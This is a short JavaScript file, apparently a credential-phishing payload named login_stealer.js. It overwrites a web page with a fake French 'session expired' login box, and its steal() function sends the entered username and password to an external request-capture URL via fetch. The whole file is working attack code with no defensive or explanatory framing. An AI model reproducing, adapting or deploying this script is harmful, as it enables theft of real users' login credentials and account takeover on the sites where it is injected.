// login_stealer.js
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;background:white;padding:20px;z-index:9999;">
    <h3>Votre session a expiré :</h3>
    <input id="user" placeholder="Identifiant">
    <input id="pass" placeholder="Mot de passe" type="password">
    <button onclick="steal()">Valider</button>
  </div>
`;

function steal() {
  fetch('https://01jtpa9tv1hahfj92dn7dbmxvp00-7695bb9a240c2e409fb7.requestinspector.com?user=' + user.value + '&pass=' + pass.value);
}
